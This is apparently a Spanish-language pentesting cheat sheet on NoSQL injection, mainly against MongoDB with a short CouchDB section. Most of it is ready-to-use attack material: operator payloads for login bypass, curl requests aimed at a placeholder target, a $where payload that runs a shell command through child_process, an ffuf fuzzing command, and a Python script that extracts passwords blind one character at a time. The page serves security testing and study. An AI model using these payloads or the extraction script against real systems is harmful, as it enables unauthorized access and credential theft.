---
title: "NoSQL Injection"
description: "NoSQL injection ocurre cuando input sin sanitizar se pasa directamente a queries de bases de datos NoSQL."
category: "Web"
date: 2026-07-18
---
# 🍃 NoSQL Injection

NoSQL injection ocurre cuando input sin sanitizar se pasa directamente a queries de bases de datos NoSQL. **MongoDB** es la más común, seguida de CouchDB, Redis y Elasticsearch.

---

## MongoDB Operator Injection

Si la app pasa el body JSON directamente a `findOne()`:

```javascript
// Vulnerable
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
});
```

### Auth Bypass — $ne (not equal)

```json
// Cualquier password que NO sea "x" → siempre true
{"username": "admin", "password": {"$ne": "x"}}

// Primer usuario de la colección (típicamente admin)
{"username": {"$ne": null}, "password": {"$ne": null}}
```

```bash
curl -s -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "x"}}'
```

### $gt (greater than)

```json
{"username": "admin", "password": {"$gt": ""}}
```

### $regex — Blind extraction

Extraer caracteres uno por uno:

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
```

True = 200, False = 403. Binary search de todo el password.

### $in — Match contra array

```json
{"username": "admin", "password": {"$in": ["password", "admin", "123456"]}}
```

### $where — JavaScript Execution (→ RCE)

```json
// Time-based (sleep 5s)
{"$where": "this.username == 'admin' && (function(){var d=new Date();while(new Date()-d<5000);return true;})()"}

// Exfiltración vía timing
{"$where": "if(this.password.match(/^a/)){var d=new Date();while(new Date()-d<5000);return true;}else{return false;}"}
```

### CVE-2024-53900: Mongoose $where RCE

```json
{
  "username": "admin",
  "$where": "function() { return this.username == 'admin' && (() => { require('child_process').exec('cat flag.txt', (e,d) => { console.log(d) }); return true })(); }"
}
```

---

## URL Parameter Injection

Cuando la app usa `application/x-www-form-urlencoded`:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=null&password[$ne]=null
```

Esto se parsea como objeto: `{username: {$ne: null}, password: {$ne: null}}`

---

## CouchDB Injection

```http
GET /db/_find HTTP/1.1
Content-Type: application/json

{"selector": {"$gt": null}}
```

**CVE-2017-12635:** Diferencia de parser Erlang vs JavaScript — agregar `_admin` con duplicate key.

---

## Detección

```bash
# Fuzzing de operadores
ffuf -w operators.txt -u https://target.com/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -mc 200
```

Wordlist: `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": ".*"}`

---

## Blind extraction automático

```python
import requests, string
url = 'http://target.com/api/users'
charset = string.digits + string.ascii_lowercase + '{}_-'

password = ''
while len(password) < 32:
    for c in charset:
        payload = {'password': {'$regex': f'^{password}{c}'}}
        r = requests.post(url, json=payload)
        if '200' in str(r.status_code):
            password += c
            break
```

---

## CVEs

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2024-53900 | 2024 | Mongoose $where RCE |
| CVE-2025-1691 | 2025 | MongoDB Shell control character injection |
| CVE-2021-22911 | 2021 | Rocket.Chat NoSQLi ($regex dump) |

---

## Relacionado
- **Autenticacion Web** — auth bypass via $ne/$gt/$regex
- **LFI RFI Path Traversal** — NoSQLi con leading null byte
- **SSTI** — $where RCE comparte técnica de inyección
- **SQL Injection**
- **Claude-BugHunter** (skill `hunt-nosqli`)
